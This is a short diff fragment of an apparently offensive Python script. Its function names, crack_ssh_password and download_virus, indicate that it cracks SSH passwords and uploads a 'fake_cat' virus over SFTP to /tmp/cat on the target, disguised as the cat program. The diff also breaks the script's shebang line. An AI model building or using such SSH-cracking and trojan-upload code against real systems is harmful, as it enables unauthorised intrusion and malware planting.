@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/usr/bin python3
 
 # cat program -> /usr/bin/cat
 # size = 43416 bytes
@@ -57,7 +57,8 @@ def crack_ssh_password():
 def download_virus(client):
 	sftp = client.open_sftp()
 	
-	sftp.put(localpath, '~/cat')
+	localpath = './fake_cat'
+	sftp.put(localpath, '/tmp/cat')
 	sftp.close()
 
 	client.close()
